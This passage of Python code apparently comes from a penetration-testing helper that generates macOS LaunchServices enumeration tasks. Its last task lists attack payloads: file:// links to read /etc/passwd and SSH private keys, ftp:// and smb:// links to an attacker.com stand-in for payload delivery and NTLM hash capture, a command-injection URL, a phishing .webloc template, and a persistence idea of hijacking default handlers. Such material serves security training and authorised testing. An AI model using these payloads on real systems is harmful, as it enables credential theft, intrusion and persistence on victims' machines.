                        'notes': 'Info.plist CFBundleTypeExtensions lists supported extensions. CFBundleURLSchemes lists URL schemes. Useful for phishing/social engineering planning.',
                        'estimated_time': '1 minute per app'
                    }
                },
                {
                    'id': f'launchservices-running-apps-{target}',
                    'name': 'Query Running Applications',
                    'type': 'command',
                    'metadata': {
                        'command': '/usr/bin/lsappinfo list',
                        'description': 'List all running applications via LaunchServices',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MACOS', 'QUICK_WIN'],
                        'flag_explanations': {
                            'lsappinfo': 'LaunchServices application info utility',
                            'list': 'List all running applications'
                        },
                        'success_indicators': [
                            'Running apps listed with ASN (Application Serial Number)',
                            'Process IDs visible',
                            'Application names shown'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Empty output',
                            'Command not available'
                        ],
                        'next_steps': [
                            'Get detailed info: lsappinfo info <ASN>',
                            'Check app entitlements',
                            'Identify high-value targets (privileged apps)',
                            'Correlate with ps output'
                        ],
                        'alternatives': [
                            'lsappinfo info -only bundleid <ASN> (get bundle ID)',
                            'lsdtrip (more detailed tool)',
                            'ps aux | grep "Applications"'
                        ],
                        'notes': 'lsappinfo queries com.apple.coreservices.launchservicesd daemon. ASN (Application Serial Number) identifies each running app. More detailed than ps.',
                        'estimated_time': '10 seconds'
                    }
                },
                {
                    'id': f'launchservices-swiftdefaultapps-{target}',
                    'name': 'Use SwiftDefaultApps Tool',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Advanced LaunchServices enumeration with SwiftDefaultApps',
                        'tags': ['OSCP:LOW', 'ENUM', 'MACOS', 'TOOL'],
                        'alternatives': [
                            '# Download SwiftDefaultApps:',
                            '# https://github.com/Lord-Kamina/SwiftDefaultApps',
                            '',
                            '# Usage:',
                            './swda getSchemes    # Get all available URL schemes',
                            './swda getApps       # Get all apps declared',
                            './swda getUTIs       # Get all Uniform Type Identifiers',
                            './swda getHandler --URL ftp  # Get handler for FTP URLs',
                            './swda getHandler --UTI public.html  # Get handler for HTML files',
                            './swda setHandler --app Firefox --URL http  # Change default',
                            '',
                            '# Enumeration output:',
                            '# - All registered URL schemes (http, ftp, ssh, custom)',
                            '# - Default handlers for each',
                            '# - File type associations (UTIs)',
                            '# - Ability to change defaults (persistence opportunity)'
                        ],
                        'notes': 'SwiftDefaultApps easier than parsing lsregister. Can change default handlers (persistence: register malicious app as default for .sh files).',
                        'estimated_time': '5 minutes'
                    }
                },
                {
                    'id': f'launchservices-lsd-daemon-{target}',
                    'name': 'Analyze /usr/libexec/lsd Daemon',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Understand LaunchServices daemon and XPC services',
                        'tags': ['OSCP:LOW', 'RESEARCH', 'MACOS'],
                        'alternatives': [
                            '# lsd is the brain of LaunchServices',
                            '# Provides XPC services:',
                            '# - .lsd.installation (app installation)',
                            '# - .lsd.open (open files/URLs)',
                            '# - .lsd.openurl (open URLs)',
                            '',
                            '# Check if running:',
                            'ps aux | grep lsd',
                            '',
                            '# List XPC services:',
                            'launchctl list | grep lsd',
                            '',
                            '# Required entitlements to use:',
                            '# - .launchservices.changedefaulthandler',
                            '# - .launchservices.changeurlschemehandler',
                            '',
                            '# Exploitation:',
                            '# - Change default handlers (requires entitlements)',
                            '# - Intercept open operations',
                            '# - Monitor file/URL opening activity'
                        ],
                        'notes': 'lsd daemon protected by entitlements. Changing defaults requires special permissions. /usr/libexec/lsd + /System/Library/CoreServices/launchservicesd work together.',
                        'estimated_time': '5 minutes research'
                    }
                },
                {
                    'id': f'exploit-url-schemes-{target}',
                    'name': 'URL Scheme Exploitation Opportunities',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Research URL scheme vulnerabilities and attack vectors',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            '# Common vulnerable URL schemes:',
                            '# 1. file:// - Read local files',
                            '#    file:///etc/passwd',
                            '#    file:///Users/victim/.ssh/id_rsa',
                            '',
                            '# 2. ftp:// - Trigger FTP connections',
                            '#    ftp://attacker.com/payload.sh',
                            '',
                            '# 3. smb:// - SMB authentication capture',
                            '#    smb://attacker.com/share (capture NTLM hash)',
                            '',
                            '# 4. ssh:// - Terminal app opens SSH',
                            '#    ssh://user@host:port',
                            '',
                            '# 5. vnc:// - Screen Sharing opens',
                            '#    vnc://host:5900',
                            '',
                            '# 6. Custom schemes - Command injection',
                            '#    myapp://param=value;command',
                            '',
                            '# Delivery vectors:',
                            '# - HTML: <a href="ftp://attacker.com">Click</a>',
                            '# - Email: mailto link redirects',
                            '# - Safari: Automatic handler invocation',
                            '# - Phishing: Craft malicious .webloc files',
                            '',
                            '# Example .webloc file:',
                            '# <?xml version="1.0"?>',
                            '# <plist><dict><key>URL</key>',
                            '# <string>file:///etc/passwd</string>',
                            '# </dict></plist>'
                        ],
                        'notes': 'URL schemes bypass sandboxing. Custom schemes often lack input validation. Historical CVEs: Zoom (CVE-2019-13450), Microsoft Teams, Slack.',
                        'estimated_time': '10-15 minutes per scheme'
                    }
                }
            ]
        }
        tasks['children'].append(launchservices_task)

        return tasks


# Example detection for macOS systems
# This plugin would be triggered by OS fingerprinting or service detection
